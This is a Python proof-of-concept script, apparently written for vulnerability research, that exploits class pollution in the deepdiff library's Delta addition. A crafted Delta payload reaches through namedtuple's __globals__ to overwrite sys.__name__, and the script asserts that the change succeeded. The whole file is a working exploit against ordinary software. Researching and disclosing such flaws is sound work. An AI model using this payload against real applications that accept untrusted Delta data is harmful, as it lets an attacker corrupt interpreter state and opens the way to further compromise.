# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: Delta.__add__
# Type: get-both-set-both

from deepdiff import Delta
from collections import namedtuple
import sys

class Target: pass
target = Target()

payload_value = "pwnd"
PAYLOAD = {
  "attribute_added": {
    "root['x']": namedtuple,
    "root['x'].'__globals__'['_sys'].'__name__'": payload_value,
  }
}

def run_poc():
  delta = Delta(PAYLOAD)
  obj = {"a": 1}
  result = obj + delta

def verify_poc():
  assert sys.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: sys.__name__ = {sys.__name__}")
  assert sys.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
